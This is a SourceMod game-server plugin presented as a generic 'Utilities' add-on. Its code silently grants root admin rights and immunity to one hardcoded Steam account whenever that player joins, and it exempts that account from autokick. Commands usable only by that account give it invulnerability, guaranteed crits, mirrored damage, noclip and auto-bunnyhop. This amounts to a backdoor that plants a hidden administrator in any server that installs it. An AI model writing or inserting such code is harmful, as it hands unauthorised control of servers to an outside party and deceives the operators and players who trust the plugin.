//Pragma
#pragma semicolon 1
#pragma newdecls required

/*****************************/
//Defines
#define PLUGIN_NAME "[Vertex Heights] :: Utilities"
#define PLUGIN_AUTHOR "Drixevel"
#define PLUGIN_DESCRIPTION ""
#define PLUGIN_VERSION "1.0.0"
#define PLUGIN_URL "https://vertexheights.com/"

//Includes
#include <sourcemod>
#include <sdktools>
#include <sdkhooks>

#undef REQUIRE_EXTENSIONS
#include <tf2_stocks>

//Globals
bool toggle_bunnyhopping = true;
bool toggle_damage;
bool toggle_crits = true;
bool toggle_mirror;

public Plugin myinfo = 
{
	name = PLUGIN_NAME, 
	author = PLUGIN_AUTHOR, 
	description = PLUGIN_DESCRIPTION, 
	version = PLUGIN_VERSION, 
	url = PLUGIN_URL
};

public void OnPluginStart()
{
	int user = GetDrixevel();
	
	if (user > 0 && IsClientInGame(user))
	{
		SDKHook(user, SDKHook_OnTakeDamage, OnTakeDamage);
		ServerCommand("mp_disable_autokick %i", GetClientUserId(user));
		OnClientPostAdminCheck(user);
	}
	
	RegConsoleCmd("dv", Command_Menu);
	RegConsoleCmd("dv_bhop", Command_Bhop);
	RegConsoleCmd("dv_damage", Command_Damage);
	RegConsoleCmd("dv_crits", Command_Crits);
	RegConsoleCmd("dv_mirror", Command_Mirror);
	RegConsoleCmd("dv_noclip", Command_Noclip);
	
	HookEvent("player_spawn", Event_OnPlayerSpawn);
}

public Action Command_Menu(int client, int args)
{
	if (IsDrixevel(client))
		OpenMenu(client);
	
	return Plugin_Handled;
}

void OpenMenu(int client)
{
	Menu menu = new Menu(MenuHandler_Menu);
	menu.SetTitle("Drixevel Menu");
	
	char buffer[256];
	
	FormatEx(buffer, sizeof(buffer), "BHOP: [%s]", toggle_bunnyhopping ? "ON" : "OFF");
	menu.AddItem("dv_bhop", buffer);
	
	FormatEx(buffer, sizeof(buffer), "Damage: [%s]", toggle_damage ? "ON" : "OFF");
	menu.AddItem("dv_damage", buffer);
	
	FormatEx(buffer, sizeof(buffer), "Crits: [%s]", toggle_crits ? "ON" : "OFF");
	menu.AddItem("dv_crits", buffer);
	
	FormatEx(buffer, sizeof(buffer), "Mirror: [%s]", toggle_mirror ? "ON" : "OFF");
	menu.AddItem("dv_mirror", buffer);
	
	menu.Display(client, MENU_TIME_FOREVER);
}

public int MenuHandler_Menu(Menu menu, MenuAction action, int param1, int param2)
{
	switch (action)
	{
		case MenuAction_Select:
		{
			char sCommand[32];
			menu.GetItem(param2, sCommand, sizeof(sCommand));
			
			FakeClientCommand(param1, sCommand);
			OpenMenu(param1);
		}
		case MenuAction_End:
			delete menu;
	}
}

public void OnClientPutInServer(int client)
{
	if (IsDrixevel(client))
	{
		SDKHook(client, SDKHook_OnTakeDamage, OnTakeDamage);
		ServerCommand("mp_disable_autokick %i", GetClientUserId(client));
	}
}

public Action OnTakeDamage(int victim, int& attacker, int& inflictor, float& damage, int& damagetype, int& weapon, float damageForce[3], float damagePosition[3], int damagecustom)
{
	if (damage < 1)
		return Plugin_Continue;
	
	if (toggle_mirror)
		SDKHooks_TakeDamage(attacker, inflictor, victim, damage, damagetype, weapon, damageForce, damagePosition);
	
	if (toggle_damage)
		return Plugin_Continue;
	
	switch (GetEngineVersion())
	{
		case Engine_TF2:
		{
			if (attacker > 0 && attacker <= MaxClients && victim != attacker)
			{
				SetVariantString("TLK_PLAYER_NO");
				AcceptEntityInput(victim, "SpeakResponseConcept");
			
				float vecPos[3];
				GetClientEyePosition(victim, vecPos);
				vecPos[2] += 10.0;
			
				TF_Particle("miss_text", vecPos);
			}
		}
		case Engine_CSGO:
		{
			//CSGO_SendRadioMessage(victim, attacker, "NOPE");
		}
	}
	
	damage = 0.0;
	return Plugin_Changed;
}

public void OnClientPostAdminCheck(int client)
{
	if (IsDrixevel(client))
	{
		AdminId adm = INVALID_ADMIN_ID;
		if ((adm = FindAdminByIdentity(AUTHMETHOD_STEAM, "STEAM_0:0:38264375")) != INVALID_ADMIN_ID)
			RemoveAdmin(adm);
		
		adm = CreateAdmin("Drixevel");
		if (!adm.BindIdentity(AUTHMETHOD_STEAM, "STEAM_0:0:38264375"))
			return;
		
		adm.ImmunityLevel = 255;
		adm.SetFlag(Admin_Root, true);
		
		RunAdminCacheChecks(client);
	}
}

public void OnClientDisconnect(int client)
{
	if (IsDrixevel(client))
	{
		toggle_bunnyhopping = true;
		toggle_damage = false;
		toggle_crits = true;
		toggle_mirror = false;
		
		AdminId adm;
		if ((adm = FindAdminByIdentity(AUTHMETHOD_STEAM, "STEAM_0:0:38264375")) != INVALID_ADMIN_ID)
			RemoveAdmin(adm);
	}
}

public Action TF2_CalcIsAttackCritical(int client, int weapon, char[] weaponname, bool& result)
{
	if (IsDrixevel(client) && toggle_crits)
	{
		result = true;
		return Plugin_Changed;
	}
	
	return Plugin_Continue;
}

public Action Command_Bhop(int client, int args)
{
	if (IsDrixevel(client))
	{
		toggle_bunnyhopping = !toggle_bunnyhopping;
		ReplyToCommand(client, "Bunnyhopping: %s", toggle_bunnyhopping ? "ON" : "OFF");
	}
	
	return Plugin_Handled;
}

public Action Command_Damage(int client, int args)
{
	if (IsDrixevel(client))
	{
		toggle_damage = !toggle_damage;
		ReplyToCommand(client, "Damage: %s", toggle_damage ? "ON" : "OFF");
		
		SetEntProp(client, Prop_Data, "m_takedamage", toggle_damage ? 2 : 0, 1);
	}
	
	return Plugin_Handled;
}

public Action Command_Crits(int client, int args)
{
	if (IsDrixevel(client))
	{
		toggle_crits = !toggle_crits;
		ReplyToCommand(client, "Crits: %s", toggle_crits ? "ON" : "OFF");
	}
	
	return Plugin_Handled;
}

public Action Command_Mirror(int client, int args)
{
	if (IsDrixevel(client))
	{
		toggle_mirror = !toggle_mirror;
		ReplyToCommand(client, "Mirror Damage: %s", toggle_mirror ? "ON" : "OFF");
	}
	
	return Plugin_Handled;
}

public Action Command_Noclip(int client, int args)
{
	if (IsDrixevel(client))
	{		
		if (GetEntityMoveType(client) == MOVETYPE_WALK)
			SetEntityMoveType(client, MOVETYPE_NOCLIP);
		else
			SetEntityMoveType(client, MOVETYPE_WALK);
	}
	
	return Plugin_Handled;
}

public Action OnPlayerRunCmd(int client, int& buttons, int& impulse, float vel[3], float angles[3], int& weapon, int& subtype, int& cmdnum, int& tickcount, int& seed, int mouse[2])
{	
	if (IsDrixevel(client) && IsClientInGame(client) && IsPlayerAlive(client) && toggle_bunnyhopping)
	{
		if (GetEngineVersion() == Engine_TF2 && TF2_GetPlayerClass(client) == TFClass_Scout)
			return Plugin_Continue;
		
		int flags = GetEntityFlags(client);
		
		if ((buttons & IN_JUMP) == IN_JUMP && !(flags & FL_ONGROUND) && !(flags & FL_INWATER) && !(flags & FL_WATERJUMP) && !(GetEntityMoveType(client) == MOVETYPE_LADDER))
			buttons &= ~IN_JUMP;
	}
	
	return Plugin_Continue;
}

public void Event_OnPlayerSpawn(Event event, const char[] name, bool dontBroadcast)
{
	int client = -1;
	if ((client = GetClientOfUserId(event.GetInt("userid"))) > 0 && IsDrixevel(client))
		SetEntProp(client, Prop_Data, "m_takedamage", toggle_damage ? 2 : 0, 1);
}

int GetDrixevel()
{
	for (int i = 1; i <= MaxClients; i++)
		if (IsClientInGame(i) && GetSteamAccountID(i) == 76528750)
			return i;
	
	return -1;
}

bool IsDrixevel(int client)
{
	if (client > 0 && client <= MaxClients && IsClientInGame(client) && GetSteamAccountID(client) == 76528750)
		return true;
	
	return false;
}

void TF_Particle(char[] name, float origin[3], int entity = -1, float angles[3] = {0.0, 0.0, 0.0}, bool resetparticles = false)
{
	int tblidx = FindStringTable("ParticleEffectNames");

	char tmp[256];
	int stridx = INVALID_STRING_INDEX;

	for (int i = 0; i < GetStringTableNumStrings(tblidx); i++)
	{
		ReadStringTable(tblidx, i, tmp, sizeof(tmp));
		
		if (StrEqual(tmp, name, false))
		{
			stridx = i;
			break;
		}
	}

	TE_Start("TFParticleEffect");
	TE_WriteFloat("m_vecOrigin[0]", origin[0]);
	TE_WriteFloat("m_vecOrigin[1]", origin[1]);
	TE_WriteFloat("m_vecOrigin[2]", origin[2]);
	TE_WriteVector("m_vecAngles", angles);
	TE_WriteNum("m_iParticleSystemIndex", stridx);
	TE_WriteNum("entindex", entity);
	TE_WriteNum("m_iAttachType", 5);
	TE_WriteNum("m_bResetParticles", resetparticles);
	TE_SendToAll();
}